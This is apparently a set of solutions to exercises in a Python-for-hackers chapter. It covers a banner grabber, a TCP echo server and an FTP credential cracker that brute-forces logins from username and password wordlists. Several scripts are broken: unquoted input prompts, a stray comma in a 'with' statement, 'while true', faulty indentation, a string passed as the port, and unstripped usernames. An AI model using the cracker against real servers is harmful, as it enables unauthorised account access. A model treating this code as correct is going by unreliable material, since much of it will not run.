# Chapter 17 Exercise Problems

### 1.

Build the SSH banner-grabbing tool from Listing 17-5 and then edit it to do a banner grab on port `21`.

---

```python
#! /usr/bin/python3

import socket

Ports = [21]

for Port in Ports:

  s = socket.socket()

  print('This is the Banner for the Port')

  print(Port)

  s.connect(('192.168.1.191', Port))

  answer = s.recv(1024)

  print(answer)

  s.close()
```

---

### 2.

Rather than hardcoding the IP address into the script, edit your banner-grabbing tool so that it prompts the user for the IP address.

---

```python
#! /usr/bin/python3

import socket

Ports = [21, 22, 25, 3306]

IP = input(IP Adress: )

for Port in Ports:

  s = socket.socket()

  print('This is the Banner for the Port')

  print(Port)

  s.connect((IP, Port))

  answer = s.recv(1024)

  print(answer)

  s.close()
```

---

### 3.

Edit your `tcp_server.py` to prompt the user for the port to listen on.

---

```python
#! /usr/bin/python3

import socket

TCP_IP = '192.168.181.190'
TCP_PORT = input('Port: ')
BUFFER_SIZE = 100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((TCP_IP, TCP_PORT))
s.listen(1)

conn, addr = s.accept()
print('Connection address: ', addr)

while true:
  data = conn.recv(BUFFER_SIZE)
  if not data:
    break
  print('Received data: ', data)
    conn.send(data) #echo

conn.close
```

---

### 4.

Build the `FTPcracker` in Listing 17-7 and the edit it to use a wordlist for user variable (similar what we did with the password) rather than prompting the user for input.

---

```python
#! /usr/bin/python3

import ftplib

server = input('FTP Server: ')

Userlist = input('Path to User List > ')

Passwordlist = input('Path to Password List > ')

try:

  with open(Userlist, 'r'), as uw:

    for user in uw:

      try:

        with open(Passwordlist, 'r') as pw:

          for word in pw:

            word = word.strip('\r\n')

            try:

              ftp = ftplib.FTP(server)

              ftp.login(user, word)

              print('Success! The password is ', word)

            except ftplib.error_perm as exc:

              print('Still trying...', exc)

      except Exception as exc:

        print('Wordlist error: ', exc)

except Exception as exc:

  print('Wordlist error: ', exc)
```

---

### 5.

Add an except clause to the banner-grabbing tool that prints "no answer" if the port is closed.

---

```python
#! /usr/bin/python3

import socket

Ports = [21, 22, 25, 3306]

IP = input(IP Adress: )

for Port in Ports:

  s = socket.socket()

  print('This is the Banner for the Port')

  print(Port)

  try:
    s.connect((IP, Port))

    answer = s.recv(1024)

    print(answer)

    s.close()

  except:
    print('No answer')
```

---
